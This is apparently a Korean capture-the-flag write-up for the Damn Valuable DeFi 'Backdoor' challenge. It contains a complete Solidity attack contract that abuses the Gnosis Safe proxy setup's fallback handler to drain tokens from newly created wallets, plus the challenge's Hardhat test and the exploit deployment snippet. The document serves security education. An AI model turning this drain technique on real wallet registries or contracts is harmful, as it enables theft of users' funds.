ERC20 주소를 넣어주게 되면 Proxy에서 존재하지 않는 transfer 함수를 호출할 수 있으므로 Proxy에 존재하는 ERC20 토큰을 공격자에게로 전송시킬 수 있다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

interface IGnosisSafeProxyFactory{
     function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract attackBackdoor_fal {
    
    IGnosisSafeProxyFactory public factory;
    DamnValuableToken public immutable token; 
    address public masterCopy;
    IProxyCreationCallback public WalletRegistry;
    address public attacker;
    constructor(address _factory,address _mastercopy,address _token,address _WalletRegistry){
        factory= IGnosisSafeProxyFactory(_factory);
        masterCopy=_mastercopy;
        token=DamnValuableToken(_token);
        WalletRegistry=IProxyCreationCallback(_WalletRegistry);
        attacker=msg.sender;
    }
    function exploit(address[] memory users) public {
        for(uint i; i<4; i++){
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 1, address(0), 0, address(token), address(0), uint256(0), address(0));

            address proxy = address(factory.createProxyWithCallback(masterCopy, initializer, 0, WalletRegistry)); 
            
            DamnValuableToken(proxy).transfer(attacker, 10 ether);
        }
    }
}
```

```solidity
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
```

test 폴더의 backdoor.challenge.js의 Exploit 부분에서 작성한 컨트랙트를 배포 후 exploit 함수를 실행해 주면 된다.

```solidity
it('Exploit', async function () {
        this.attackFactory = await ethers.getContractFactory("attackBackdoor_fal",attacker);
        this.attackcontract = await this.attackFactory.deploy( this.walletFactory.address, this.masterCopy.address, this.token.address, this.walletRegistry.address);
        await this.attackcontract.connect(attacker).exploit(users);
    });
```

![성공_fal.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28a5536d-3a13-4d3e-8d0a-ef716c04ba67/%EC%84%B1%EA%B3%B5_fal.png)

npm run backdoor를 통하여 Exploit이 성공적으로 진행되어 문제의 목표를 달성한 것을 확인할 수 있다.
